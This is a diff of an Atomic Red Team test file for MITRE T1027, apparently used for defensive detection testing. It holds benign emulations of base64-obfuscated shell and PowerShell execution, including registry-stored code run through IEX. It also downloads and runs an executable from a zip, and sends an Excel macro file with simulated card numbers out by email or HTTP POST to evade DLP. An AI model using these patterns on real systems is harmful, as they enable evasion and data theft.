@@ -1,69 +1,65 @@
----
 attack_technique: T1027
 display_name: Obfuscated Files or Information
-
 atomic_tests:
 - name: Decode base64 Data into Script
+  auto_generated_guid: f45df6be-2e1e-4136-a384-8f18ab3826fb
   description: |
     Creates a base64-encoded data file and decodes it into an executable shell script
 
+    Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
   supported_platforms:
-    - macos
-    - linux
-
+  - macos
+  - linux
   executor:
-    name: sh
-    elevation_required: false
     command: |
       sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat"
       cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
       chmod +x /tmp/art.sh
       /tmp/art.sh
-
+    name: sh
 - name: Execute base64-encoded PowerShell
+  auto_generated_guid: a50d5a97-2531-499e-a1de-5544c74432c6
   description: |
     Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.
 
+    Upon successful execution, powershell will execute an encoded command and stdout default is "Write-Host "Hey, Atomic!"
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     powershell_command:
       description: PowerShell command to encode
       type: String
       default: Write-Host "Hey, Atomic!"
   executor:
-    name: powershell
-    elevation_required: false
     command: |
       $OriginalCommand = '#{powershell_command}'
       $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
       $EncodedCommand =[Convert]::ToBase64String($Bytes)
       $EncodedCommand
-
       powershell.exe -EncodedCommand $EncodedCommand
-
+    name: powershell
 - name: Execute base64-encoded PowerShell from Windows Registry
+  auto_generated_guid: 450e7218-7915-4be4-8b9b-464a49eafcec
   description: |
     Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.
 
+    Upon successful execution, powershell will execute encoded command and read/write from the registry.
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
-    powershell_command:
-      description: PowerShell command to encode
-      type: String
-      default: Write-Host "Hey, Atomic!"
     registry_key_storage:
       description: Windows Registry Key to store code
       type: String
       default: HKCU:Software\Microsoft\Windows\CurrentVersion
+    powershell_command:
+      description: PowerShell command to encode
+      type: String
+      default: Write-Host "Hey, Atomic!"
     registry_entry_storage:
       description: Windows Registry entry to store code under key
       type: String
       default: Debug
   executor:
-    name: powershell
-    elevation_required: false
     command: |
       $OriginalCommand = '#{powershell_command}'
       $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
@@ -74,3 +70,83 @@ atomic_tests:
       powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"
     cleanup_command: |
       Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage} -Name #{registry_entry_storage}
+    name: powershell
+- name: Execution from Compressed File
+  auto_generated_guid: f8c8a909-5f29-49ac-9244-413936ce6d1f
+  description: |
+    Mimic execution of compressed executable. When successfully executed, calculator.exe will open.
+  supported_platforms:
+  - windows
+  input_arguments:
+    url_path:
+      description: url to download Exe
+      type: url
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      T1027.exe must exist on disk at $env:temp\temp_T1027.zip\T1027.exe
+    prereq_command: |
+      if (Test-Path $env:temp\temp_T1027.zip\T1027.exe) {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
+      Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
+  executor:
+    command: |
+      "%temp%\temp_T1027.zip\T1027.exe"
+    cleanup_command: |
+      taskkill /f /im calculator.exe >nul 2>nul
+      rmdir /S /Q %temp%\temp_T1027.zip >nul 2>nul
+      del /Q "%temp%\T1027.zip" >nul 2>nul
+    name: command_prompt
+
+- name: DLP Evasion via Sensitive Data in VBA Macro over email
+  auto_generated_guid: 129edb75-d7b8-42cd-a8ba-1f3db64ec4ad
+  description: |
+    Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.
+    Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.
+  supported_platforms:
+  - windows
+  input_arguments:
+    input_file:
+      description: Path of the XLSM file
+      type: path
+      default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
+    sender:
+      description: sender email
+      type: string
+      default: test@corp.com
+    receiver:
+      description: receiver email
+      type: string
+      default: test@corp.com
+    smtp_server:
+      description: SMTP Server IP Address
+      type: string
+      default: 127.0.0.1
+  executor:
+    command: |
+      Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments #{input_file} -SmtpServer #{smtp_server}
+    name: powershell
+
+- name: DLP Evasion via Sensitive Data in VBA Macro over HTTP
+  auto_generated_guid: e2d85e66-cb66-4ed7-93b1-833fc56c9319
+  description: |
+    Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.
+    Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.
+  supported_platforms:
+  - windows
+  input_arguments:
+    input_file: 
+      description: Path of the XLSM file
+      type: path
+      default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
+    ip_address:
+      description: Destination IP address
+      type: string
+      default: 127.0.0.1
+  executor:
+    command: |
+      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body #{input_file}
+    name: powershell
